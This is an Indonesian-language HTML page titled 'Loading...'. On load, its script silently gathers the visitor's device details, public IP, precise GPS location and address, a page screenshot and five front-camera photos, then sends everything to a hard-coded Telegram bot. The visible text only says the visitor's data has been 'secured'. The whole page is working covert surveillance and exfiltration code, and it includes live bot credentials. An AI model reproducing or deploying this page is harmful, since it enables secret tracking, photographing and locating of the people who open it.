<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #000;
      margin: 0;
      padding: 0;
      height: 100vh;
      font-family: 'Share Tech Mono', monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #00ff00;
      text-align: center;
    }
    #msg {
      opacity: 0;
      animation: fadein 2s ease-in-out forwards;
    }
    @keyframes fadein {
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <div id="msg">
      Data anda telah saya amankan<br>
    Terima kasih atas kerja samanya.
  </div>

<script>
const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
const chatId = '5914256752';

const sendToTelegram = async (text) => {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
  });
};

const sendPhoto = async (blob, filename) => {
  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('photo', blob, filename);
  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
};

const getGPUInfo = () => {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  const ext = gl?.getExtension('WEBGL_debug_renderer_info');
  return ext ? {
    vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
    renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
  } : { vendor: 'Unknown', renderer: 'Unknown' };
};

const getDeviceBrand = () => {
  const ua = navigator.userAgent;
  if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
  if (/Oppo|CPH/.test(ua)) return 'Oppo';
  if (/SM-|Samsung/.test(ua)) return 'Samsung';
  if (/Infinix/.test(ua)) return 'Infinix';
  if (/RMX/.test(ua)) return 'Realme';
  if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
  return 'Android Device';
};

const getBatteryInfo = async () => {
  try {
    const bat = await navigator.getBattery();
    return {
      level: Math.round(bat.level * 100) + '%',
      charging: bat.charging ? 'Yes' : 'No'
    };
  } catch {
    return { level: 'Unknown', charging: 'Unknown' };
  }
};

const getIPInfo = async () => {
  const res = await fetch('https://ipapi.co/json');
  return await res.json();
};

const getGeoInfo = async (lat, lon) => {
  const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
  return await res.json();
};

const getScreenshot = async () => {
  const canvas = await html2canvas(document.body);
  canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
};

// ‚úÖ Bagian ini yang DIGANTI SESUAI PERMINTAAN
const captureCamera = async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement('video');
    video.setAttribute('playsinline', '');
    video.srcObject = stream;

    await video.play();
    await new Promise(r => setTimeout(r, 1500));

    for (let i = 1; i <= 5; i++) {
      if (video.readyState >= 2) {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        await new Promise(resolve => {
          canvas.toBlob(blob => {
            sendPhoto(blob, `camera_${i}.jpg`);
            resolve();
          }, 'image/jpeg');
        });
        await new Promise(r => setTimeout(r, 1500));
      }
    }

    stream.getTracks().forEach(t => t.stop());
    await sendToTelegram('üì∑ 5 Foto dari kamera depan berhasil dikirim.');
  } catch (e) {
    await sendToTelegram('‚ùå Kamera gagal diakses.');
  }
};
// ‚õî END perubahan

const captureLocation = async () => {
  try {
    navigator.geolocation.getCurrentPosition(async pos => {
      const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
      const geo = await getGeoInfo(latitude, longitude);
      const address = geo?.display_name || 'Unknown';
      const lokasi = `
üìç GPS LOCATION
[+] Latitude       : ${latitude} deg
[+] Longitude      : ${longitude} deg
[+] Accuracy       : ${accuracy} m
[+] Altitude       : ${altitude ?? 'Unknown'} m
[+] Direction      : Not Available
[+] Speed          : ${speed ?? 'Unknown'} m/s
[+] Google Maps    : ${maps}
[+] Address        : ${address}`.trim();
      await sendToTelegram(lokasi);
    }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
  } catch {}
};

const collectInfo = async () => {
  const gpu = getGPUInfo();
  const brand = getDeviceBrand();
  const battery = await getBatteryInfo();
  const ip = await getIPInfo();
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const info = `
üì¶ DEVICE INFORMATION
[+] Device Brand   : ${brand}
[+] OS             : Android
[+] Platform       : ${navigator.platform}
[+] CPU Cores      : ${navigator.hardwareConcurrency}
[+] RAM            : ${navigator.deviceMemory || 'Unknown'} GB
[+] GPU Vendor     : ${gpu.vendor}
[+] GPU            : ${gpu.renderer}
[+] Resolution     : ${screen.width}x${screen.height}
[+] Orientation    : ${screen.orientation?.type || 'Unknown'}
[+] Browser        : ${navigator.userAgent}
[+] Browser Engine : WebKit/537.36
[+] Timezone       : ${timezone}
[+] Uptime         : ${(performance.now()/1000/60).toFixed(1)} minutes
[+] Battery Level  : ${battery.level}
[+] Charging       : ${battery.charging}

üåê NETWORK / IP
[+] Public IP      : ${ip.ip}
[+] Continent      : ${ip.continent_name}
[+] Country        : ${ip.country_name}
[+] Region         : ${ip.region}
[+] City           : ${ip.city}
[+] Org            : ${ip.org}
[+] ISP            : ${ip.org}
[+] Google Maps    : https://www.google.com/maps/place/${ip.latitude}+${ip.longitude}`.trim();

  await sendToTelegram(info);
  captureLocation();
  captureCamera();
  getScreenshot();
};

window.onload = collectInfo;
</script>
</body>
</html>
